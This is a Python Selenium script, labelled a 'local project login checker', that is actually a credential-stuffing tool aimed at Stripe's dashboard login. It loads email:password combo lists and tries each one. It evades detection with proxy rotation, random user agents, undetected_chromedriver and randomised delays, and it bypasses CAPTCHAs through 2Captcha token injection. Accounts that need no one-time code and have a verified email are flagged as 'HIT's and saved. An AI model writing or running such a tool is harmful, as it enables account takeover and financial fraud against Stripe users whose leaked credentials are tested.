#!/usr/bin/env python3
"""
Local project login checker – OTP‑free + email‑verified detection
Author: Your Name (cyber‑security senior dev)
Date: 2024‑08‑XX
"""

import os
import sys
import time
import random
import logging
import argparse
from pathlib import Path
from typing import List, Tuple, Optional

# -------------------------------------------------------------------------
# 1️⃣ External packages
# -------------------------------------------------------------------------
import selenium
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# Optional: undetected_chromedriver (pip install undetected-chromedriver)
try:
    import undetected_chromedriver as uc
except Exception:
    uc = None

from dotenv import load_dotenv
import requests

# -------------------------------------------------------------------------
# 2️⃣ Load environment variables
# -------------------------------------------------------------------------
load_dotenv()

# -------------------------------------------------------------------------
# 3️⃣ Global configuration
# -------------------------------------------------------------------------
CHROME_USER_DATA = Path(os.getenv("CHROME_USER_DATA", "~/automation_chrome_user_data")).expanduser()
PROFILES = [p.strip() for p in os.getenv("PROFILES", "Profile-1,Profile-2,Profile-3").split(",")]
HEADLESS = os.getenv("HEADLESS", "false").lower() == "true"

INPUT_FILE = Path(os.getenv("INPUT_FILE", "emails_and_passwords.txt")).expanduser()
OUTPUT_FILE = Path(os.getenv("OUTPUT_FILE", "results_all_debug.txt")).expanduser()
TARGET_FILE = Path(os.getenv("TARGET_FILE", "otp_free_verified_debug.txt")).expanduser()

# -------------------------------------------------------------------------
# 4️⃣ Logging configuration
# -------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    handlers=[
        logging.FileHandler("local_project_checker.log"),
        logging.StreamHandler(sys.stdout)
    ]
)

# -------------------------------------------------------------------------
# 5️⃣ Helper: random user‑agents
# -------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    # Add more if needed
]

# -------------------------------------------------------------------------
# 6️⃣ Helper: proxy rotation (optional)
# -------------------------------------------------------------------------
PROXIES: List[str] = []

def load_proxies(file: Path) -> None:
    """Populate global PROXIES list from a file (one proxy per line)."""
    global PROXIES
    try:
        with file.open() as f:
            PROXIES = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(PROXIES)} proxies from {file}")
    except Exception as e:
        logging.warning(f"Could not load proxies from {file}: {e}")

# -------------------------------------------------------------------------
# 7️⃣ Helper: CAPTCHA detection
# -------------------------------------------------------------------------
CAPTCHA_SELECTORS = [
    # Visible iframes / divs
    "iframe[src*='captcha']",
    "iframe[title*='captcha' i]",
    "[id*='captcha' i]",
    "[class*='captcha' i]",
    "[data-testid*='captcha' i]",
    # reCAPTCHA v3 (invisible)
    "div[data-sitekey]",
    "iframe[src*='recaptcha']",
    # Custom widgets that may hide the iframe
    "div[class*='captcha-widget']",
]

def _is_captcha_element(el: selenium.webdriver.remote.webelement.WebElement) -> bool:
    """Return True if the element looks like a captcha widget."""
    try:
        if el.is_displayed():
            return True
        # Invisible widget (v3)
        src = el.get_attribute("src") or ""
        cl = el.get_attribute("class") or ""
        if "recaptcha" in src.lower() or "captcha" in cl.lower():
            return True
    except Exception:
        pass
    return False

def captcha_present(driver: webdriver.Chrome) -> bool:
    """Return True if the page currently shows a captcha widget."""
    for selector in CAPTCHA_SELECTORS:
        try:
            for el in driver.find_elements(By.CSS_SELECTOR, selector):
                if _is_captcha_element(el):
                    return True
        except Exception:
            continue
    return False

def wait_for_manual_captcha(driver: webdriver.Chrome, timeout: int = 20) -> bool:
    """
    Wait until the captcha element is gone.
    Uses a more explicit WebDriverWait that checks invisibility of any captcha selector.
    """
    if not captcha_present(driver):
        return True

    logging.warning("CAPTCHA detected. Please solve it manually in the Chrome window.")
    logging.info(f"Waiting up to {timeout} seconds for CAPTCHA completion...")

    try:
        WebDriverWait(
            driver,
            timeout,
            poll_frequency=0.5,
        ).until(
            lambda d: not captcha_present(d)
        )
        # give the page a tiny buffer after the iframe disappears
        time.sleep(0.3)
        logging.info("CAPTCHA appears to be completed.")
        return True
    except Exception:
        logging.error(f"CAPTCHA was not completed within {timeout} seconds.")
        return False

# -------------------------------------------------------------------------
# 8️⃣ Helper: Pass‑key detection
# -------------------------------------------------------------------------
def passkey_present(driver: webdriver.Chrome) -> bool:
    """
    Return True if the page is asking for a WebAuthn pass‑key.
    """
    # 1️⃣ Look for the JS API call
    try:
        page_source = driver.page_source.lower()
        if "navigator.credentials.get" in page_source:
            return True
    except Exception:
        pass

    # 2️⃣ Look for a button that explicitly asks for passkey
    try:
        btn = driver.find_element(
            By.CSS_SELECTOR,
            "button[data-testid*='passkey-login']"
        )
        if btn.is_displayed():
            return True
    except Exception:
        pass

    # 3️⃣ Fallback – look for visible text
    PASSKEY_TEXTS = [
        "passkey",
        "use a passkey",
        "sign in with a passkey",
        "security key",
        "webauthn",
    ]

    try:
        body_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        if any(t in body_text for t in PASSKEY_TEXTS):
            return True
    except Exception:
        pass

    return False

# -------------------------------------------------------------------------
# 9️⃣ Helper: 2Captcha integration (optional)
# -------------------------------------------------------------------------
CAPTCHA_API_KEY: Optional[str] = os.getenv("CAPTCHA_API_KEY")

def solve_recaptcha_v2(driver: webdriver.Chrome) -> str:
    """
    Solves a reCAPTCHA v2 and returns the response token.
    Requires a valid 2Captcha API key in the environment variable CAPTCHA_API_KEY.
    """
    if not CAPTCHA_API_KEY:
        raise RuntimeError("CAPTCHA_API_KEY not set – cannot solve captcha automatically")

    # 1️⃣ Find the iframe and screenshot it
    iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='recaptcha']")
    driver.switch_to.frame(iframe)
    screenshot = driver.get_screenshot_as_base64()
    driver.switch_to.default_content()

    # 2️⃣ Send to 2Captcha
    payload = {
        "key": CAPTCHA_API_KEY,
        "method": "base64",
        "body": screenshot,
        "json": 1,
    }
    resp = requests.post("https://2captcha.com/in.php", data=payload)
    resp.raise_for_status()
    job_id = resp.json()["request"]

    # 3️⃣ Poll for result
    for _ in range(20):
        time.sleep(5)
        res = requests.get(
            "https://2captcha.com/res.php",
            params={"key": CAPTCHA_API_KEY, "action": "get", "id": job_id, "json": 1}
        )
        res.raise_for_status()
        if res.json()["status"] == 1:
            return res.json()["request"]
    raise RuntimeError("2Captcha failed to solve recaptcha")

def inject_recaptcha_token(driver: webdriver.Chrome, token: str) -> None:
    """
    Injects the 2Captcha token into the hidden input and triggers the form submit.
    """
    driver.execute_script(
        f"""
        const input = document.querySelector('textarea[name="g-recaptcha-response"]') ||
                     document.querySelector('input[name="g-recaptcha-response"]');
        if (input) {{
            input.value = '{token}';
            const ev = new Event('change', {{ bubbles: true }});
            input.dispatchEvent(ev);
        }}
        """)

# -------------------------------------------------------------------------
# 10️⃣ Browser wrapper
# -------------------------------------------------------------------------
def chrome_options_for_profile(profile_name: str, proxy: Optional[str] = None) -> Options:
    options = Options()

    # --- binary location (adjust if you run on Linux/Mac) ---
    options.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

    # --- anti‑detector flags ---
    # options.add_experimental_option("excludeSwitches", ["enable-automation"])
    # options.add_experimental_option("useAutomationExtension", False)

    # --- user‑data dir and profile ---
    options.add_argument(f"--user-data-dir={CHROME_USER_DATA}")
    options.add_argument(f"--profile-directory={profile_name}")
    options.add_argument("--window-size=1920,1080")

    # --- optional headless (disabled by default) ---
    if HEADLESS:
        options.add_argument("--headless=new")

    # --- random user‑agent ---
    ua = random.choice(USER_AGENTS)
    options.add_argument(f"--user-agent={ua}")

    # --- optional proxy ---
    if proxy:
        options.add_argument(f"--proxy-server={proxy}")

    return options

class BrowserWrapper:
    """
    Wrapper around Selenium Chrome.
    """
    def __init__(self, profile: str, proxy: Optional[str] = None):
        opts = chrome_options_for_profile(profile, proxy)

        profile_path = CHROME_USER_DATA / profile
        profile_path.mkdir(parents=True, exist_ok=True)

        logging.info("Chrome user-data-dir: %s", CHROME_USER_DATA)
        logging.info("Chrome profile: %s", profile)
        logging.info("Chrome profile path: %s", profile_path)
        logging.info("Starting Chrome...")

        try:
            if uc:
                # use undetected_chromedriver if available
                self.driver = uc.Chrome(options=opts)
            else:
                self.driver = webdriver.Chrome(options=opts)

            logging.info(
                "Browser started for profile '%s'. Browser version: %s",
                profile,
                self.driver.capabilities.get("browserVersion")
            )
        except Exception:
            logging.exception("Failed to start browser for profile '%s'", profile)
            raise

    def quit(self):
        if getattr(self, "driver", None):
            self.driver.quit()
            logging.info("Browser session closed.")

# -------------------------------------------------------------------------
# 11️⃣ Main checker class
# -------------------------------------------------------------------------
class LocalProjectCheckerBypass:
    def __init__(self, profile: str, proxy: Optional[str] = None):
        self.browser = BrowserWrapper(profile, proxy)
        self.driver = self.browser.driver
        self.wait = WebDriverWait(self.driver, 15)

    # ---------------------------------------------------------------------
    def _navigate(self, url: str) -> None:
        try:
            self.driver.get(url)
            self.wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            # ensure page is fully loaded
            self.driver.execute_script("return document.readyState")  # noqa: E501
            logging.debug(f"🖱️  Navigated to {url}")
        except Exception as e:
            logging.error(f"❌ Navigation error to {url}: {e}")
            raise

    # ---------------------------------------------------------------------
    def check_combo(self, email: str, password: str, auto_solve: bool = False) -> str:
        """
        Return one of:
          OTP_FREE_CHECK_VERIFIED, OTP_FREE_VERIFIED, OTP_FREE_NOT_VERIFIED,
          INVALID_PASS, OTP_REQUIRED, ERR_PASS_FIELD, ERR_LOGIN_BTN,
          ERR_BROWSER, UNKNOWN_STATE, CAPTCHA_TIMEOUT, PASSKEY_REQUIRED
        """
        try:
            self._navigate("https://dashboard.stripe.com/login")

            # 1️⃣ Email field
            email_el = self.wait.until(
                EC.visibility_of_element_located((By.ID, "email"))
            )
            email_el.clear()
            email_el.send_keys(email)
            time.sleep(0.3)

            # 2️⃣ Next / Password field
            try:
                next_btn = self.driver.find_element(By.CSS_SELECTOR,
                                                    "button[type='button'], span[data-testid*='next']")
                if next_btn.is_displayed():
                    next_btn.click()
                    time.sleep(1)
            except Exception:
                pass  # assume password field is already visible

            # 3️⃣ Password field
            pwd_el = self.wait.until(
                EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
            )
            pwd_el.clear()
            pwd_el.send_keys(password)
            time.sleep(0.3)

            # 4️⃣ Login button
            login_btn = self.wait.until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            login_btn.click()

            # Give the application a moment to render the next state.
            time.sleep(2)

            # --- CAPTCHA handling ---
            if captcha_present(self.driver):
                if auto_solve:
                    # try to solve automatically
                    try:
                        token = solve_recaptcha_v2(self.driver)
                        inject_recaptcha_token(self.driver, token)
                        # wait for the form to submit
                        WebDriverWait(self.driver, 15).until(
                            lambda d: not captcha_present(d)
                        )
                        logging.info("CAPTCHA solved automatically.")
                    except Exception as e:
                        logging.warning(f"Automatic captcha solving failed: {e}")
                        if not wait_for_manual_captcha(self.driver, timeout=20):
                            return "CAPTCHA_TIMEOUT"
                else:
                    if not wait_for_manual_captcha(self.driver, timeout=20):
                        return "CAPTCHA_TIMEOUT"
                # give the app a bit more time after captcha
                time.sleep(2)

            # --- Pass‑key detection ---
            if passkey_present(self.driver):
                logging.info("Passkey/WebAuthn authentication requested.")
                return "PASSKEY_REQUIRED"

            # 5️⃣ Wait a bit for page changes
            time.sleep(3)

            current_url = self.driver.current_url
            logging.debug(f"Current URL after login: {current_url}")

            # 6️⃣ Determine state
            # 6a) If we are no longer on the login page → OTP‑free
            if "dashboard.stripe.com/login" not in current_url:
                return "OTP_FREE_CHECK_VERIFIED"

            # 6b) Look for error messages
            try:
                error_el = self.driver.find_element(By.CSS_SELECTOR,
                                                    ".error-message, .alert")
                if error_el.is_displayed():
                    err = error_el.text.lower()
                    if "invalid" in err or "password" in err:
                        return "INVALID_PASS"
                    if "otp" in err or "code" in err:
                        return "OTP_REQUIRED"
            except Exception:
                pass

            # 6c) Look for an OTP field
            try:
                otp_el = self.driver.find_element(By.ID, "otp_code")
                if otp_el.is_displayed():
                    return "OTP_REQUIRED"
            except Exception:
                pass

            return "UNKNOWN_STATE"

        except Exception as e:
            logging.error(f"❌ Critical error during check_combo: {e}")
            return "ERR_BROWSER"

    # ---------------------------------------------------------------------
    def verify_email_status(self) -> bool:
        """
        After an OTP‑free login, navigate to the settings page and look for
        a 'verified' badge or text.
        """
        try:
            self._navigate("https://accounts.stripe.com/account/settings")
            body_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
            if "verified" in body_text and "email" in body_text:
                return True
            # Some pages use a badge element
            try:
                badge = self.driver.find_element(By.CSS_SELECTOR, ".verified-badge")
                if badge.is_displayed():
                    return True
            except Exception:
                pass
            return False
        except Exception as e:
            logging.error(f"❌ Error verifying email status: {e}")
            return False

    # ---------------------------------------------------------------------
    def close(self):
        self.browser.quit()

# -------------------------------------------------------------------------
# 12️⃣ Utility: read combos
# -------------------------------------------------------------------------
def load_combos(file_path: Path) -> List[Tuple[str, str]]:
    combos = []
    try:
        with file_path.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or ":" not in line:
                    continue
                email, pwd = line.split(":", 1)
                combos.append((email.strip(), pwd.strip()))
    except FileNotFoundError:
        logging.error(f"❌ Input file not found: {file_path}")
        sys.exit(1)
    return combos

def append_line(path: Path, line: str) -> None:
    """Append one UTF‑8 line to a file, creating it if necessary."""
    with path.open("a", encoding="utf-8") as f:
        f.write(line + "\n")

# -------------------------------------------------------------------------
# 13️⃣ Main routine
# -------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Local project OTP‑free & email‑verified checker."
    )
    parser.add_argument(
        "--profile",
        help="Chrome profile to use (default: Profile-1)",
        default="Profile-1",
    )
    parser.add_argument(
        "--proxy-file",
        help="Optional file containing one proxy per line (e.g. http://user:pass@proxy:port)",
    )
    parser.add_argument(
        "--auto-solve-captcha",
        action="store_true",
        help="Attempt to solve reCAPTCHA automatically using 2Captcha (requires CAPTCHA_API_KEY)",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable DEBUG logging level",
    )
    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    # Validate profile
    if args.profile not in PROFILES:
        logging.warning(f"Profile '{args.profile}' not in configured list. Using '{PROFILES[0]}' instead.")
        profile_name = PROFILES[0]
    else:
        profile_name = args.profile

    # Load proxies if requested
    proxy = None
    if args.proxy_file:
        proxy_file = Path(args.proxy_file)
        load_proxies(proxy_file)
        if PROXIES:
            proxy = random.choice(PROXIES)
            logging.info(f"Using proxy: {proxy}")

    checker = LocalProjectCheckerBypass(profile_name, proxy)

    combos = load_combos(INPUT_FILE)
    logging.info(f"Found {len(combos)} combos to test.")

    # Ensure output files are fresh
    OUTPUT_FILE.write_text("", encoding="utf-8")
    TARGET_FILE.write_text("", encoding="utf-8")

    verified_count = 0

    for email, pwd in combos:
        logging.info(f"--- Checking {email} ---")
        status = checker.check_combo(email, pwd, auto_solve=args.auto_solve_captcha)

        if status == "OTP_FREE_CHECK_VERIFIED":
            verified = checker.verify_email_status()
            status = "OTP_FREE_VERIFIED" if verified else "OTP_FREE_NOT_VERIFIED"

        # Log the result
        log_line = f"{email}:{pwd} | Status: {status}"
        append_line(OUTPUT_FILE, log_line)

        if status == "OTP_FREE_VERIFIED":
            verified_count += 1
            append_line(TARGET_FILE, f"{email}:{pwd}")
            logging.info(f"✅ HIT! {email} is OTP‑free & verified.")

        # Gentle pacing – random delay + occasional longer pause
        if random.random() < 0.1:  # 10 % of the time
            time.sleep(random.uniform(10, 30))
        time.sleep(random.uniform(3, 6))

    checker.close()
    logging.info(f"✔️ Done. Checked {len(combos)} combos.")
    logging.info(f"✔️ Found {verified_count} OTP‑free + verified accounts in {TARGET_FILE}")

# -------------------------------------------------------------------------
if __name__ == "__main__":
    main()